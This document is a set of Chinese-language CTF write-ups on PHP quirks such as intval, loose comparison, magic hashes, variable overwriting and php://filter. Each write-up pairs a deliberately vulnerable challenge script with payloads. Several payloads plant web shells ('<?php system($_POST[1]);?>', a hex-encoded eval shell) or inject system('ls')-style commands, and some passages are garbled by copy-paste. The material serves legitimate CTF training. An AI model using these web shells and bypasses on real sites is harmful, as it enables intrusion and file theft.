---
title: "PHP 特性"
date: 2024-11-01
---
# PHP 特性


```php
 <?php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
} 
```

```
这里有个intval函数：获取变量的整数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 得出pyload：?num[]=1



// intval 转换数组类型时 不关心数组中的内容 只判断数组中有没有元素
// 空数组 返回 0
// 非空数组 返回 1
?num[]=1


preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1
```

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}

```

```
因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=4476%23

intval($var,$base)，其中var必填，base可选，这里base=0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。 这里===表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。 paylod：num=010574或num=0x117c

?num=+4476

?num=4476;

?num=4476.0

?num=4476"

?num=0x117c

?num=4476e1

【< php7.1】intval("4476e1") === 4476 【php 7.1+】intval("4476e1") === 44760 intval("4476abc") === 4476
```

```php
 <?php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){  // 多行模式
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}

```

```
考查：正则表达式是匹配方法 https://blog.csdn.net/qq_46091464/article/details/108278486 可以通过 %0a 绕过 payload： abc%0aphp



这道题从GET参数中获取'cmd'，然后检查这个参数是否等于'php'。如果是，它会再次检查这个参数是否完全等于'php'。如果这两个检查都通过，脚本会输出'hacker'，否则，它会输出flag。

问题在于，这两个检查使用了不同的正则表达式匹配模式。第一个使用了'/im'，这意味着i（忽略大小写）和m（多行模式）。第二个只使用了'i'，也就是忽略大小写。

这意味着，如果你可以找到一种方式让'cmd'参数在第一次检查时通过，但在第二次检查时失败，那么你就可以得到flag。

在这里，你可以利用多行模式。如果你将'cmd'参数设置为'php\nPHP'，那么第一次检查会通过（因为它会在多行中查找'php'，并忽略大小写），但第二次检查会失败（因为它只在单行中查找'php'，并且不会忽略大小写）。

因此，你可以通过以下URL获取flag：

http://<target>/script.php?cmd=php%0aPHP

这里的'%0a'是url编码的换行符。

```

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

```
intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以

1.payload:?num=4476.1

?num=0x117c

intval( mixed $var[, int $base = 10] ) : int

intval($num,0)==4476根据num的格式来决定使用的进制，这里可以使用16进制。0x117c
```

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

```
过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num=010574

同上一题:?num=4476.1轻松绕过

增加字母过滤，可以用8进制 ?num=010574 //以 0 开头，但不以 0x 或 0X 等开头，它会被解释为八进制。



?num=010574

"010574" == 4476 False

preg_match("/[a-z]/i", "010574") False

intval("010574", 0)==4476 True

// intval 会忽略小数部分

?num=4476.5

"4476.5" == 4476 False

preg_match("/[a-z]/i", "4476.5") False

intval("4476.5", 0)==4476 True


?num=010574、?num=4476.1、?num=+4476.1
```

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

```
在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0

开头不能为0，但是必须要有0

也可以使用换行: `?num=4476%0a0`

?num=4476.02

strpos(string,find,start)有三个参数，string是被检查的字符串，find是要被搜索的字符串，start是开始检索的位置，从0开始。

?num=%0A010574

?num=+010574
```

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

```
可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574

?num=%20010574

?num=%2b010574

?num=%09010574

?num=+010574
```

```php
 <?php
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

```
在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php

?u=php://filter/read=convert.base64-encode/resource=flag.php
```

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

```
php检查两数组是否相等的时候，不会检查指针是否相等，而是会检查元素是否相等(我的猜测是类似于调用str方法再进行对比，因为[1,2]测试了实际上不等于[2,1]而[1]是等于[1]的)

所以可以post以下内容

a[]=1&b[]=2
```

```php
<?php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?> 
```

```
在burp中将报文改成以下内容（注意修改Host为你自己的域名，以及最后一行的flag=flag的上一行是空行）
POST /?a=1 HTTP/1.1
Host: 186f9538-b339-4ad5-ab55-974b54479916.challenge.ctf.show
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: flag=flag
FLAG: flag
Content-Length: 9

flag=flag

方法二：cookie增加HTTP_FLAG=flag 通过 URL 传递 任意值如url/?1 在 POST 请求中传递 flag=flag

解法：get随便传参，POST传入HTTP_FLAG=flag


https://www.php.cn/php-notebook-172859.html https://www.php.cn/php-weizijiaocheng-383293.html 考点是PHP里面的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址 我们可以修改一下代码

<?php
include('flag.php');
if($_GET){
$_GET=&$_POST;//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地
址)
}else{
"flag";
} i
f($_GET['flag']=='flag'){
$_GET=&$_COOKIE;
}else{
'flag';
1 2 3 4 5 6 7 8 9
10
11所以我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag
中间的代码没有作用，因为我们不提交 flag 参数
web99
payload: get : ?n=1.php
post:content=<?php system($_POST[1]);?>
web100
这道题基本上没有对参数进行过滤,所以直接执行命令
payload:
web101
https://segmentfault.com/q/1010000000770535
考察使用函数打印对象里面的属性。
我们可以出100的题里面看到提示，ctfshow.php里面就只有属性。并且最后的属性就是flag.
我们可以使用Reflectionclass类，打印类的结构
payload:
} i
f($_GET['flag']=='flag'){
$_GET=&$_SERVER;
}else{
'flag';
} i
f($_GET['HTTP_FLAG']=='flag'){//需要满足这个条件就可以输出flag
highlight_file($flag);
}else{
highlight_file(__FILE__);
}

所以我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag 中间的代码没有作用，因为我们不提交 flag 参数

```

```php
 <?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

```
in_array函数的特性

题目代码中存在的知识点：

array_push——往数组尾部插入元素
rand(1,$i)——随机生成1-877之间的数
//所以array_push($allow, rand(1,$i))就是往数组中插入1-877之间的数字
in_array——搜索数组中是否存在指定的值:
in_array(search,array,type)
search为指定搜索的值
array为指定检索的数组
type为TRUE则 函数还会检查 search的类型是否和 array中的相同

综上，我们可以发现数组中的值是int，而在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5.php中，然后蚁剑连接即可查看到flag

<?php
highlight_file(__FILE__);
$allow = array();//设置为数组
for ($i=36; $i < 0x36d; $i++) {
array_push($allow, rand(1,$i));//向数组里面插入随机数
} i
f(isset($_GET['n']) && in_array($_GET['n'], $allow)){
//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1
file_put_contents($_GET['n'], $_POST['content']);
//写入1.php文件 内容是<?php system($_POST[1]);?>
} ?
>

payload: get : ?n=1.php post:content=
```

```php
 <?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
?>
```

```
这道题基本上没有对参数进行过滤,所以直接执行命令
/?v1=1&v2=system("cp+ctfshow.php+1.txt")?>&v3=;

因为v2，v3不需要是数字，and运算时v0已经计算完毕了

然后访问/1.txt

根据文件提示将0x2d替换成-得到flag



简单拼接

三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可

if($v0){
    if(!preg_match("/\;/", $v2)){ # 表示v2中不能有符号 ；
        if(preg_match("/\;/", $v3)){ #表示v3 中必须要有 ;
            eval("$v2('ctfshow')$v3"); # 这里是eval中 拼接v2 v3 
        }
    }
}

v2=var_dump($ctfshow)/*
v3=*/;

拼接起来就是var_dump($ctfshow)/ ('ctfshow') / ; 可以执行

v2 也可以用其他显示输出的函数

v2=print_r($ctfshow)/*&v3=*/;
```

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}

?> 
```

```
?v1=1&v2=echo new Reflectionclass&v3=;

替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位

涉及到类，可以考虑使用 ReflectionClass 建立反射类。

new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。

元数据对象（包含class的所有属性/方法的元数据信息）。

payload：v1=1&v2=echo new ReflectionClass&v3=;

flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可
```

```php
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
?> 
```

```
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
#访问1.php后查看源代码获得flag



web102

题目中几个重要的php函数： substr() 字符串截取

call_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数

file_put_contents() 用来写文件进去，第一个参数是文件名，第二个参数是需要写进文件中的内容 文件名支持伪协议

根据上述条件分析，思路大概就是通过file_put_contents()函数来创建文件，文件中注入攻击代码即可

payload： 参数分析： v1是调用方法
v2是数字字符串，且是写进文件中的内容 v3是文件名（可通过伪协议来创建）

v3=php://filter/write=convert.base64-decode/resource=2.php v2:写进2.php的内容 ——> 查看当前页面源码；<?=cat *; ——> 转为base64为PD89YGNhdCAqYDs ——>转为16进制的ascii码为5044383959474e6864434171594473——>绕过截断，在前面随意加两位数字225044383959474e6864434171594473 v1：将数字字符串还原为base64码 ——> hex2bin

最终payload： v1=hex2bin v2=225044383959474e6864434171594473 v3=php://filter/write=convert.base64-decode/resource=2.php


发现一个很奇怪的地方...

首先观察题目，v2是数字也是文件内容，v3是文件名，v1是修改v2的函数名，最终file_put_contents，所以很明显了，就是写个马上去

同时，要去掉v2的前两个字符，更加明显了，题目用意就是让我们用16进制，0x3c3f706870206576616c28245f4745545b22636d64225d293b3f3e这个16进制数字在被hex2bin以后会变成<?php eval($_GET["cmd"]);?>，因为它是数字，所以能过掉第一个if，经过v1传入的hex2bin，被转化成并写入v3的文件中。

但是我的测试失败了，我不死心，在服务器上面写了这道题目上去，php版本5.4.16，linux/apache2，结果是可以成功写入的，is_numeric认为0x3c3f706870206576616c28245f4745545b22636d64225d293b3f3e是数字，而题目环境似乎不认为它是数字，所以无法过掉第一个if

只能通过精心构造数字115044383959474e6864434171594473传入v2，含一个e是科学计数，被hex2bin转化成base64语句，再由v3传入php://filter/write=convert.base64-decode/resource=1.php最终写入<?=`cat *`;，访问1.php打开f12就可以看到flag

最终payload

?v2=0x3c3f706870206576616c28245f4745545b22636d64225d293b3f3e&v3=/var/www/html/1.php

同时post内容：
v1=hex2bin
```

```php
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?> 
```

```
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
#访问1.php后查看源代码获得flag



依然是PHP5的题目

和上一题一样, 只是写马的时候不允许依次出现php三个字母, 用<?= 替换即可 如果一定要用PHP 7环境, payload和上一题一样

我发现一个很有意思的事情 就是进行base64编码后再进行hex编码；位数不够会自动补充3d也就是=
```

```php
 <?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?>
```

```
#payload
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
```

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?> 
```

```
考察:php的变量覆盖 payload： GET: ?suces=flag POST: error=suces

看懂逻辑，先GET再POST 1、题目中的$suces这个变量并未进行过多限制 2、foreach后面的$$代表覆盖复制 3、按照顺序条件触发先覆盖GET，再覆盖POST。直接在GET中?suces=flag，此时的suces就是flag 4、根据POST条件直接不为flag即可，因为?suces=flag了，所以在POST中error=suces，即可绕过所有，得到答案 payload： GET:URL/?suces=flag POST:error=suces
```

```php
<?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
?> 
```

```
法一

碰撞aaO8zKZF以及aaK1STfY
法二

两个数组的话指针在比较时不相等，但作为sha1的参数时，会调用方法变成字符串Array，故sha1相等



更正一下 PHP 中关于哈希函数的返回结果

不论是 md5 还是 sha1 函数，当其参数为一个数组时，函数不能将其转换为对应的哈希值，因此返回值为空（即 null），但并不是 false，而是 warning

false 的程序讨论其返回值是没有意义的，但 warning 的程序返回值会根据实际情况而有所不同

因此，当哈希函数的参数为数组时，其返回的值为 null 而不是 false
```

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

}

?> 
```

```
GET: ?v3=240610708 POST: v1=flag=0

变量覆盖就是通过parse_str以及$$等对变量进行了覆盖。
本题中，我们可以看到必须给v1去post 一个值，才会进入if。同时，v3是get传参。

此外，要重点理解一下parse_str的含义。https://www.w3school.com.cn/php/func_string_parse_str.asp
1、如果没有设置第二个参数，则解析后将赋值给同名变量。
2、parse_str($v1,$v2)，则会将v1解析后，放到v2变量里面。上面链接里面有实例。
刚开始没理解parse_str，以为v2也可以post进去，一顿乱做。下次还是要把不懂的函数，好好先看懂。

对本题而言
解法1：

我们只要满足v3的md5等于v2[flag]即可。可以传递给v3任意值，然后v1=flag=v3的md5值。
解法2：

我们传入v3[]=1，则md5($v3)就是null 这时候v1随便传,也可以满足if($v2['flag']==md5($v3))

v3=QNKCDZO; v1=flag=0 因为MD50e可以绕，


web107 首先看函数的用法 parse_str($str, $output);

我们可以得到思路 $_POST['v1']->v1=v2; $_GET['v3']->v3[]=1;

这样进入判断之后就是v3[]=1为NULL，v1=v2也为NULL； 这是我自己做题的思路，如果有哪里不对的话，请师傅们指出

```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
error
```

```
ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配

?c=a%00778

0、ereg正则匹配，需要字母开头或结尾（已废弃的功能，可能是这样...）；strrev逆序倒置 1、题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00，截断的意思就是读到%00就不读了。 paylaod: GET:?c=a%00778

?c=a%00778 ereg函数的漏洞：00截断。%00截断及遇到%00则默认为字符串的结束 strrev() 反转字符串
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}
?>
```

```
Exception 异常处理类 http://c.biancheng.net/view/6253.html payload: ?v1=Exception&v2=system('cat fl36dg.txt') ?v1=Reflectionclass&v2=system('cat fl36dg.txt')

用匿名类绕过 ?v1=class{ public function __construct(){ system('ls'); } };&v2=a

v1=内置类&v2=system('ls')即可 php中会先执行ls命令然后把结果作为参数再执行但ls的结果已经被输出了

使用ReflectionClass /?v1=ReflectionClass&v2=system('ls) 还可以利用ReflectionFunction

使用迭代器获取当前目录 FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，getcwd()这个函数可以获取当前文件路径，二者在一定条件下配合使用较好 得到文件名，再进行访问

{使用php自带的内置方法}
{在php官方文档找到带有::__toString的后缀，这种是类}
{我把带__toString的函数罗列一些出来}
CachingIterator::__toString()
DirectoryIterator::__toString
Error::__toString
Exception::__toString
pyload:
?v1= CachingIterator&v2=system(ls)
?v1= DirectoryIterator&v2=system(ls)
?v1= Error&v2=system(ls)
?v1= Exception&v2=system(ls)
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}
?>
```

```
考察：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpff.com/filesystemiterator https://www.php.net/manual/zh/class.filesystemiterator.php getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1=FilesystemIterator&v2=getcwd



过滤掉了内置类的手法，只能硬凑了
类FilesystemIterator可以用来遍历目录，需要一个路径参数
函数getcwd可以返回当前工作路径且不需要参数，由此可以构造payload
/?v1=FilesystemIterator&v2=getcwd



这里说一下为什么Directoryiterator为什么不能用？

当你创建一个 DirectoryIterator 对象并将其实例化为某个目录时，该对象会默认指向所代表的目录。举个例子，如果你创建一个 DirectoryIterator 对象来表示 /var/www/html 目录，那么该对象就会默认指向 /var/www/html 目录。

而当你对这个目录进行迭代操作时，DirectoryIterator 会遍历该目录中的所有文件和子目录。这意味着，遍历的结果会包括当前目录 . 和上级目录 ..。通常，这两个特殊的目录会作为遍历结果的一部分返回，因为它们是文件系统中的标准目录表示法。

所以，使用 DirectoryIterator 遍历目录时，默认情况下会包括 . 和 .. 这两个目录项。
```

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?> 
```

```
考察：全局变量 为了满足条件，我们可以利用全局变量来进行赋值给ctfshow这个变量 payload: ?v1=ctfshow&v2=GLOBALS


注意 PHP 的函数具有词法作用域

在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：

    我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&$$v2 就为 $flag 对应的值

    URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null

    要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1

Payload：....../?v1=ctfshow&v2=GLOBALS
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}

```

```
php://filter/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php



过滤器有很多备选

题中过滤了 data、input 等伪协议，又过滤了 string、data、rot13 相关的过滤器，但我们依然可以用 php://filter 伪协议搭载其他过滤器

常见的过滤器：

convert.quoted-printable-encode

convert.iconv.*

zlib.deflate

bzip2.compress

string.rot13

string.tolower

convert.base64-decode

选择限制字符以外的过滤器即可

当然，也可以不用过滤器：....../?file=php://filter/resource=flag.php
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

```
利用函数所能处理的长度限制进行目录溢出： 原理：/proc/self/root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了。 /proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php

compress.zlib://flag.php
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```

```
payload: php://filter/resource=flag.php

Php://filter/zlib.deflate|zlib.inflate/resource=flag.php
```

```php
<?php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

```
payload:num?%0c36
%0c==\f

在php中"36"是等于"\x0c36"的，同时trim也不会过滤掉\x0c也就是%0c，提交payload: /?num=%0c36
此时$num不等于36，且为数字，trim以后也不等于36，且'\x0c36'=='36'

【payload:num=%0c36】 ①trim()函数会去掉num里的%0a %0b %0d %20 %09 这里只有%0c可用。②num!==36是对的，原因：强比较状态下是比较两个字符串，等于是'%0c36'和‘36’比是不是相等，肯定不相等。③num==36是对的。原因：弱比较状态下会把传入的num进行类似于【intval()】的一个转化【这里不一定是intval转化】最后比较的实际上是‘36’==‘36’。肯定相等。④函数is_numeric()：检测是不是数字/数字字符串。这里的%0c是换页符，%09，%20都可以让is_numeric()函数为true；
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>

```

```
POST: CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag



这道题目中，对c进行限制，但是没有限制字母和空格，c=echo $flag 就可以运行

但是要必须保证CTF_SHOW存在 和 CTF_SHOW.COM存在 而 fl0g 不存在

由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换

payload

POST : CTF_SHOW=&CTF[SHOW.COM=1&fun= echo $flag
```

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

```
GET:?1=flag.php POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])

